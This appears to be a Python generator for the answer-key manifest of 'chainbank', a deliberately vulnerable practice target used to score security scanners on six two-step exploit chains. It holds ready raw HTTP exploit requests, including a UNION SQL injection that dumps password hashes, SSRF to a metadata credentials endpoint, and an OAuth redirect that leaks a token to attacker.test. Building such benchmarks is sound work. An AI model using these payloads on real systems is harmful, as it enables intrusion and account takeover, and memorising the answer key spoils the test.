#!/usr/bin/env python3
"""Generate range/chainbank/manifest.yaml.

This file is the source of truth. Never hand-edit the manifest: the PoC request
strings, the compound severities and the required narrative phrases all have to
stay consistent with each other and with `tests/chains.test.ts`, and a
hand-written YAML copy of that drifts.

Regenerate with:  python3 scripts/write_manifest.py
"""

from __future__ import annotations

from pathlib import Path

import yaml

TARGET = Path(__file__).resolve().parents[1]


def http(
    method: str,
    path: str,
    *,
    host: str = "localhost:4002",
    headers: dict[str, str] | None = None,
    body: str | None = None,
) -> str:
    """Render a raw HTTP request the replay harness can send."""
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}", "Connection: close"]
    for name, value in (headers or {}).items():
        lines.append(f"{name}: {value}")
    if body is not None:
        # A caller-supplied Content-Type wins; emitting a second one makes the
        # request ambiguous and Express refuses it.
        if not any(name.lower() == "content-type" for name in (headers or {})):
            lines.append("Content-Type: application/json")
        # The placeholders are replaced at replay time, so the length written here
        # is wrong by construction. The harness computes the real one.
    
    request = "\r\n".join(lines) + "\r\n\r\n"
    if body is not None:
        request += body
    return request


JSON = {"Content-Type": "application/json"}
AUTH = {"Authorization": "Bearer {{TOKEN}}", "Content-Type": "application/json"}

# The multipart body is built by the replay harness from the actual file bytes,
# because a Content-Length guessed here would not match the payload it sends.
# This is the request line and headers only.
MULTIPART_UPLOAD = (
    "POST /api/documents HTTP/1.1\r\n"
    "Host: localhost:4002\r\n"
    "Authorization: Bearer {{TOKEN}}\r\n"
    "Content-Type: multipart/form-data; boundary=REDFALL\r\n"
    "Connection: close\r\n\r\n"
)


def chain(
    chain_id: str,
    *,
    name: str,
    title: str,
    start_state: str,
    end_state: str,
    severity: str,
    cvss_compound: float,
    cwe: list[str],
    narrative_must_contain: list[str],
    steps: list[dict],
) -> dict:
    return {
        "id": chain_id,
        "name": name,
        "title": title,
        "category": "exploit_chain",
        "severity": severity,
        "cvss_compound": cvss_compound,
        "cwe": cwe,
        "start_state": start_state,
        "end_state": end_state,
        "steps": steps,
        "narrative_must_contain": narrative_must_contain,
    }


def step(
    n: int,
    *,
    finding_id: str,
    title: str,
    route: str,
    file: str,
    symbol: str,
    lines: list[int],
    cwe: str,
    severity: str,
    cvss: float,
    description: str,
    state_before: str,
    state_after: str,
    request: str,
    expect: str,
    expect_expr: str,
    yields: str | None = None,
) -> dict:
    out = {
        "n": n,
        "finding_id": finding_id,
        "title": title,
        "route": route,
        "cwe": cwe,
        "severity": severity,
        "cvss_score": cvss,
        "location": {"file": file, "symbol": symbol, "lines": lines},
        "description": description,
        "state_before": state_before,
        "state_after": state_after,
        "poc": {"type": "http", "request": request, "expect": expect, "expect_expr": expect_expr},
    }
    if yields:
        out["yields"] = yields
    return out


CHAINS: list[dict] = [
    chain(
        "CHN-01",
        name="idor_to_account_takeover",
        title="Unauthenticated account lookup to full account takeover",
        start_state="none:*",
        end_state="user_creds:bob",
        severity="critical",
        cvss_compound=9.4,
        cwe=["CWE-639", "CWE-640"],
        narrative_must_contain=[
            "owner_email",
            "password reset",
            "reset_token",
            "attacker controls the account",
        ],
        steps=[
            step(
                1,
                finding_id="CHAINBANK-001",
                title="Account lookup discloses the owner email without authentication",
                route="GET /api/accounts/:accountNo",
                file="src/routes/accounts.ts",
                symbol="router.get('/:accountNo')",
                lines=[18],
                cwe="CWE-639",
                severity="high",
                cvss=7.5,
                description=(
                    "The support lookup returns account_no, owner_email, label and balance for any "
                    "account number with no authentication and no ownership check. The email address "
                    "is the credential the password-reset flow keys on, so this disclosure is not "
                    "informational: it is the first half of a takeover."
                ),
                state_before="none:*",
                state_after="secret:owner_email",
                request=http("GET", "/api/accounts/CB-0002"),
                expect="The response names the account owner's email address",
                expect_expr=(
                    "status === 200 && json.account.owner_email === 'bob@chainbank.test' "
                    "&& json.account.balance"
                ),
                yields="owner_email",
            ),
            step(
                2,
                finding_id="CHAINBANK-002",
                title="Password reset returns the reset token in its response",
                route="POST /api/auth/password-reset",
                file="src/routes/auth.ts",
                symbol="router.post('/password-reset')",
                lines=[42],
                cwe="CWE-640",
                severity="critical",
                cvss=9.1,
                description=(
                    "The endpoint proves the caller controls the address by handing back the token it "
                    "just generated. Any caller who knows an email can therefore set that account's "
                    "password. Combined with CHAINBANK-001, which supplies the email, an unauthenticated "
                    "attacker takes over any account in two requests."
                ),
                state_before="secret:owner_email",
                state_after="user_creds:bob",
                request=http(
                    "POST",
                    "/api/auth/password-reset",
                    body='{"email": "bob@chainbank.test"}',
                ),
                expect="The response contains a usable reset_token for the victim's address",
                expect_expr=(
                    "status === 200 && typeof json.reset_token === 'string' "
                    "&& /^[0-9a-f]{32}$/.test(json.reset_token)"
                ),
                yields="reset_token",
            ),
        ],
    ),
    chain(
        "CHN-02",
        name="sqli_to_admin_session",
        title="SQL injection to an administrative session",
        start_state="none:*",
        end_state="admin_creds:admin",
        severity="critical",
        cvss_compound=9.8,
        cwe=["CWE-89", "CWE-287"],
        narrative_must_contain=[
            "UNION",
            "password_hash",
            "by-hash",
            "administrative",
        ],
        steps=[
            step(
                1,
                finding_id="CHAINBANK-003",
                title="Search builds SQL by string concatenation",
                route="GET /api/search",
                file="src/routes/search.ts",
                symbol="router.get('/')",
                lines=[17],
                cwe="CWE-89",
                severity="critical",
                cvss=9.8,
                description=(
                    "The q parameter is interpolated directly into the WHERE clause, so a UNION can "
                    "append arbitrary rows to the result set. The output column names come from the "
                    "first SELECT, so the extracted password_hash arrives in the email field of the "
                    "injected row."
                ),
                state_before="none:*",
                state_after="db_read:users",
                request=http(
                    "GET",
                    "/api/search?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20password_hash"
                    "%2C%20role%2C%20balance%20FROM%20users%20WHERE%20username%3D%27admin%27%20--%20",
                ),
                expect="A row appears whose email field holds a bcrypt hash for the admin user",
                expect_expr=(
                    "status === 200 && json.results.some(r => String(r.email).startsWith('$2a$')) "
                    "&& json.count > 4"
                ),
                yields="password_hash",
            ),
            step(
                2,
                finding_id="CHAINBANK-004",
                title="Login accepts a raw password hash instead of a password",
                route="POST /api/search/by-hash",
                file="src/routes/search.ts",
                symbol="router.post('/by-hash')",
                lines=[46],
                cwe="CWE-287",
                severity="critical",
                cvss=9.1,
                description=(
                    "Added for a user-import feature and never removed, this endpoint compares the "
                    "submitted hash to the stored one. Reading the hash in step 1 is therefore enough "
                    "to authenticate as its owner — no cracking required."
                ),
                state_before="db_read:users",
                state_after="admin_creds:admin",
                request=http(
                    "POST",
                    "/api/search/by-hash",
                    headers=JSON,
                    body='{"username": "admin", "password_hash": "{{PASSWORD_HASH}}"}',
                ),
                expect="The response carries a token that passes the admin-only user listing",
                expect_expr=(
                    "status === 200 && typeof json.token === 'string' && json.user.role === 'admin'"
                ),
                yields="admin_token",
            ),
        ],
    ),
    chain(
        "CHN-03",
        name="upload_to_code_execution",
        title="Unrestricted file upload to remote code execution",
        start_state="user_creds:admin",
        end_state="code_exec:app",
        severity="critical",
        cvss_compound=9.6,
        cwe=["CWE-434", "CWE-94"],
        narrative_must_contain=[
            "upload",
            "plugin directory",
            "require",
            "code execution",
        ],
        steps=[
            step(
                1,
                finding_id="CHAINBANK-005",
                title="Upload keeps the client-supplied filename and extension",
                route="POST /api/documents",
                file="src/routes/documents.ts",
                symbol="multer.diskStorage",
                lines=[34],
                cwe="CWE-434",
                severity="high",
                cvss=8.8,
                description=(
                    "multer is configured with the original filename as the stored name and the plugin "
                    "directory as the destination. There is no extension allow-list and no content "
                    "check, so a .js upload lands where the loader reads from."
                ),
                state_before="user_creds:admin",
                state_after="file_write:plugin_dir",
                request=MULTIPART_UPLOAD,
                expect="The file is accepted and stored under the plugin directory",
                expect_expr=(
                    "status === 201 && json.document.filename === 'evil.js' "
                    "&& json.document.stored_path.endsWith('evil.js')"
                ),
                yields="stored_path",
            ),
            step(
                2,
                finding_id="CHAINBANK-006",
                title="Plugin reload require()s every file in the plugin directory",
                route="POST /api/plugins/reload",
                file="src/routes/plugins.ts",
                symbol="router.post('/reload')",
                lines=[38],
                cwe="CWE-94",
                severity="critical",
                cvss=9.1,
                description=(
                    "require() compiles and runs the file. There is no signature check, no allow-list "
                    "and no sandbox, so the upload becomes code execution as soon as this route is "
                    "called. The route is admin-only, which is exactly why it needs the previous step."
                ),
                state_before="file_write:plugin_dir",
                state_after="code_exec:app",
                request=http("POST", "/api/plugins/reload", headers=AUTH),
                expect="The uploaded file is listed as executed and its marker is returned",
                expect_expr=(
                    "status === 200 && json.files_executed.includes('evil.js') "
                    "&& json.loaded.some(p => p.marker === 'CHAINBANK_RCE_MARKER')"
                ),
            ),
        ],
    ),
    chain(
        "CHN-04",
        name="ssrf_to_cloud_credentials",
        title="SSRF to instance metadata, then a working cloud role assumption",
        start_state="user_creds:alice",
        end_state="secret:cloud_credentials",
        severity="critical",
        cvss_compound=9.3,
        cwe=["CWE-918", "CWE-522"],
        narrative_must_contain=[
            "metadata",
            "AccessKeyId",
            "assume",
            "cloud credentials",
        ],
        steps=[
            step(
                1,
                finding_id="CHAINBANK-007",
                title="Preview fetches any URL the caller supplies",
                route="POST /api/preview",
                file="src/routes/preview.ts",
                symbol="router.post('/')",
                lines=[22],
                cwe="CWE-918",
                severity="high",
                cvss=8.6,
                description=(
                    "The URL is taken from the request body with no allow-list and no block on private "
                    "or link-local addresses, so the caller chooses where the server connects. The "
                    "interesting destination is the internal metadata service, which is unreachable "
                    "from outside and authenticates nothing."
                ),
                state_before="user_creds:alice",
                state_after="ssrf_reach:internal",
                request=http(
                    "POST",
                    "/api/preview",
                    headers=AUTH,
                    body='{"url": "http://127.0.0.1:4002/api/internal/metadata/iam/credentials"}',
                ),
                expect="The server returns the metadata document including an access key id",
                expect_expr=(
                    "status === 200 && json.status === 200 "
                    "&& JSON.parse(json.body).AccessKeyId === 'AKIACHAINBANKEXAMPLE'"
                ),
                yields="access_key_id",
            ),
            step(
                2,
                finding_id="CHAINBANK-008",
                title="Stolen cloud credentials authenticate against the assume-role endpoint",
                route="POST /api/internal/cloud/assume",
                file="src/routes/internal.ts",
                symbol="router.post('/cloud/assume')",
                lines=[42],
                cwe="CWE-522",
                severity="critical",
                cvss=8.8,
                description=(
                    "The credentials recovered through SSRF are accepted by the role-assumption "
                    "endpoint, which proves they are live rather than merely present. A wrong key is "
                    "rejected with 403, so the success is evidence about the key and not about the "
                    "endpoint."
                ),
                state_before="ssrf_reach:internal",
                state_after="secret:cloud_credentials",
                request=http(
                    "POST",
                    "/api/internal/cloud/assume",
                    headers=JSON,
                    body=(
                        '{"access_key": "AKIACHAINBANKEXAMPLE", '
                        '"secret_key": "wJalrXUtnFEMI/chainbank/secret/key"}'
                    ),
                ),
                expect="The role assumption succeeds with the key read in step 1",
                expect_expr="status === 200 && json.assumed === true && json.role.includes('treasury')",
            ),
        ],
    ),
    chain(
        "CHN-05",
        name="signing_key_disclosure_to_forged_admin",
        title="Signing-key disclosure to a forged administrative transfer",
        start_state="none:*",
        end_state="db_write:accounts",
        severity="critical",
        cvss_compound=9.7,
        cwe=["CWE-200", "CWE-347"],
        narrative_must_contain=[
            "jwt_secret",
            "forged",
            "admin",
            "transfer",
        ],
        steps=[
            step(
                1,
                finding_id="CHAINBANK-009",
                title="Unauthenticated config dump exposes the JWT signing key",
                route="GET /api/debug/config",
                file="src/routes/debug.ts",
                symbol="router.get('/config')",
                lines=[15],
                cwe="CWE-200",
                severity="high",
                cvss=7.5,
                description=(
                    "The route is unauthenticated and returns every row of app_settings, including the "
                    "key tokens are signed with. The key lives in the database rather than the "
                    "environment precisely so that a read vulnerability is enough to take it."
                ),
                state_before="none:*",
                state_after="secret:jwt_key",
                request=http("GET", "/api/debug/config"),
                expect="The response contains the JWT signing key in plaintext",
                expect_expr=(
                    "status === 200 && json.settings.jwt_secret "
                    "=== 'chainbank-jwt-signing-key-do-not-share'"
                ),
                yields="jwt_secret",
            ),
            step(
                2,
                finding_id="CHAINBANK-010",
                title="A locally signed admin token is accepted by the transfer endpoint",
                route="POST /api/admin/transfer",
                file="src/routes/admin.ts",
                symbol="router.post('/transfer')",
                lines=[24],
                cwe="CWE-347",
                severity="critical",
                cvss=9.1,
                description=(
                    "Verification uses the same key the config dump exposed, so a token minted off-box "
                    "with role=admin passes requireAdmin and moves money between accounts. A token "
                    "signed with any other key is rejected with 401."
                ),
                state_before="secret:jwt_key",
                state_after="db_write:accounts",
                request=http(
                    "POST",
                    "/api/admin/transfer",
                    headers=AUTH,
                    body=(
                        '{"from_account": "CB-ADMIN-001", "to_account": "CB-0003", '
                        '"amount": 1234, "memo": "chained"}'
                    ),
                ),
                expect="The transfer succeeds and both balances change by the stated amount",
                expect_expr=(
                    "status === 200 && json.status === 'transferred' && json.amount === 1234 "
                    "&& json.accounts.length === 2"
                ),
            ),
        ],
    ),
    chain(
        "CHN-06",
        name="open_redirect_to_token_theft",
        title="Open redirect to theft of a live session token",
        start_state="none:*",
        end_state="session_token:carol",
        severity="high",
        cvss_compound=8.4,
        cwe=["CWE-601", "CWE-598"],
        narrative_must_contain=[
            "redirect",
            "access_token",
            "attacker origin",
            "session",
        ],
        steps=[
            step(
                1,
                finding_id="CHAINBANK-011",
                title="Redirect accepts an arbitrary destination with no host allow-list",
                route="GET /api/redirect",
                file="src/routes/redirect.ts",
                symbol="router.get('/')",
                lines=[15],
                cwe="CWE-601",
                severity="medium",
                cvss=6.1,
                description=(
                    "The url parameter is passed straight to res.redirect, so any origin can be the "
                    "target. On its own this is a phishing aid; chained with the OAuth consent route it "
                    "carries a token off-site."
                ),
                state_before="none:*",
                state_after="none:*",
                request=http("GET", "/api/redirect?url=https%3A%2F%2Fattacker.test%2Fx"),
                expect="The response redirects to the attacker-controlled origin",
                expect_expr="status === 302 && headers.location === 'https://attacker.test/x'",
            ),
            step(
                2,
                finding_id="CHAINBANK-012",
                title="OAuth consent appends the access token to whatever redirect target it is given",
                route="GET /api/oauth/authorize",
                file="src/routes/oauth.ts",
                symbol="router.get('/authorize')",
                lines=[22],
                cwe="CWE-598",
                severity="high",
                cvss=8.1,
                description=(
                    "The token is inserted into the sessions table and appended to the redirect URI's "
                    "query string. Because the redirect target is caller-controlled and unvalidated, a "
                    "live session token is delivered to an attacker origin and authenticates as its "
                    "owner at /api/me."
                ),
                state_before="none:*",
                state_after="session_token:carol",
                request=http(
                    "GET",
                    "/api/oauth/authorize?username=carol&redirect_uri=https%3A%2F%2Fattacker.test%2Fcb",
                ),
                expect="The Location header carries an access_token to the attacker origin",
                expect_expr=(
                    "status === 302 && headers.location.startsWith('https://attacker.test/cb?') "
                    "&& /access_token=[0-9a-f]{48}/.test(headers.location)"
                ),
                yields="access_token",
            ),
        ],
    ),
]

# Individual findings, exposed at top level so a scanner that reports single
# vulnerabilities rather than chains can still be scored against them.
FINDINGS: list[dict] = []
for entry in CHAINS:
    for item in entry["steps"]:
        FINDINGS.append(
            {
                "id": item["finding_id"],
                "finding_id": item["finding_id"],
                "chain_id": entry["id"],
                "step": item["n"],
                "title": item["title"],
                "route": item["route"],
                "category": "exploit_chain_step",
                "cwe": item["cwe"],
                "severity": item["severity"],
                "cvss_score": item["cvss_score"],
                "location": item["location"],
                "description": item["description"],
                "state_before": item["state_before"],
                "state_after": item["state_after"],
                "poc": item["poc"],
            }
        )


def main() -> None:
    document = {
        "version": 2,
        "target": "chainbank",
        "purpose": (
            "Every vulnerability in this target exists to be a step in a longer path. "
            "Generated by scripts/write_manifest.py; do not hand-edit."
        ),
        "chains": CHAINS,
        "findings": FINDINGS,
        "scoring": {
            "chain_recall_target": ">= 5 of 6",
            "chain_recall_definition": (
                "A chain counts as recalled when every one of its findings is reported and the "
                "reported set contains at least two finding ids that the report joins into one path."
            ),
            "cvss_compound_note": (
                "cvss_compound is the expected combined severity for the chain. A report that scores "
                "a chain below its worst single step is wrong: chaining can add risk but cannot "
                "remove it."
            ),
        },
    }
    out = TARGET / "manifest.yaml"
    out.write_text(yaml.safe_dump(document, sort_keys=False, width=100, allow_unicode=True))
    print(
        f"wrote {out}: {len(CHAINS)} chains, {len(FINDINGS)} findings, "
        f"{len({f['finding_id'] for f in FINDINGS})} distinct finding ids"
    )


if __name__ == "__main__":
    main()
